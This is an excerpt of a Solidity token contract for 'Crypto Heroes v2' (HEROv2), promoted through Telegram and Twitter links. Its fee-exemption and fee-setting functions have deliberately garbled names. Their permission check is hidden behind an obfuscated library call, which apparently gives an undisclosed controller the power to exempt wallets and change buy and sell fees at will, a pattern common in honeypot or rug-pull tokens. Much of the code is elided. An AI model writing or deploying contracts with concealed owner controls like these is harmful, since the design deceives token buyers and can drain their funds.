/*
https://t.me/CryptoHeroesV2Portal
Twitter: https://twitter.com/CryptoHeroesETH
*/
...
contract HEROv2 is IERC20, Ownable, AntiBotSecurity {
    ...
    string private _name = "Crypto Heroes v2";
    string private _symbol = "HEROv2";
    ...
    function _transfer(
        ...
        if (!isOutOfChrgsesx(from) && !isOutOfChrgsesx(to)){
            if (isMarket(from)) {
    ...
    function isOutOfChrgsesx(address _user) public view returns (bool) {
        return excludedFromFee[_user];
    } 

    function outOfChrgsesx(address _user, bool _status) public {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function newChrgsesx(uint256 _buyFee, uint256 _sellFee) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
    ...
    function currChrgsesx() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
